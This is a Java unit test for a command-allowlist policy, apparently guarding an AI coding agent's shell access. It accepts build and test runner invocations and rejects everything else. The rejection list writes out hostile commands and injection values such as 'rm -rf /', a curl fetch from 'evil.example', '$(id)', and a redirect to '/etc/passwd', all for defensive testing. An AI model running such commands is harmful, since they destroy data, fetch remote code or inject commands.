package com.agenticai.core.sdlc.harness;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class CodingCommandPolicyTest {

    private final CodingCommandPolicy policy = CodingCommandPolicy.defaults();

    @ParameterizedTest
    @ValueSource(strings = {
        "mvn test", "mvn -q clean verify", "./mvnw -B test -Dtest=FooTest", "mvn -o -T1 test",
        "gradle test --info", "./gradlew check", "npm test", "npm run build", "npm test --silent",
        "pytest", "pytest -q tests/unit -x", "go test ./...", "go vet ./...", "go test -run=TestFoo -count=1 ./pkg/foo",
    })
    void acceptsAllowedRunnerInvocations(String command) {
        assertEquals(command.strip().replaceAll(" +", " "), policy.validate(command));
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "rm -rf /", "bash -c id", "sh run.sh", "curl http://evil.example/x.sh", "python -m pytest", "npx jest",
        "mvn test; rm -rf /", "mvn test && curl x", "mvn test | tee out", "mvn test > /etc/passwd", "mvn `id`",
        "mvn $(id)", "mvn test\nrm -rf /", "mvn 'test'", "mvn \"test\"", "mvn test #", "mvn exec:exec",
        "mvn org.codehaus.mojo:exec-maven-plugin:exec", "mvn -f ../pom.xml test", "mvn -s /tmp/settings.xml test",
        "gradle -p /etc test", "gradle --init-script x.gradle test", "go run main.go", "go generate ./...",
        "npm install", "npm exec evil", "npm run", "npm test --prefix /tmp", "pytest /etc", "pytest ../other",
        "pytest ~/x", "./evil.sh", "/usr/bin/mvn test", "mvn", "gradle", "", "   ",
    })
    void rejectsEverythingElse(String command) {
        assertThrows(IllegalArgumentException.class, () -> policy.validate(command), command);
    }

    @Test
    void rejectsNull() {
        assertThrows(IllegalArgumentException.class, () -> policy.validate(null));
    }

    @Test
    void rejectsOverlongCommands() {
        assertThrows(IllegalArgumentException.class, () -> policy.validate("pytest " + "a".repeat(400)));
    }

    @Test
    void configurationOnlyNarrowsTheRunnerSet() {
        CodingCommandPolicy narrow = new CodingCommandPolicy(List.of("pytest", "bash", "rm"));
        assertEquals(java.util.Set.of("pytest"), narrow.allowedRunners());
        assertEquals("pytest -q", narrow.validate("pytest -q"));
        assertThrows(IllegalArgumentException.class, () -> narrow.validate("mvn test"));
        assertTrue(new CodingCommandPolicy(null).allowedRunners().isEmpty());
        assertThrows(IllegalArgumentException.class, () -> new CodingCommandPolicy(null).validate("pytest"));
    }
}
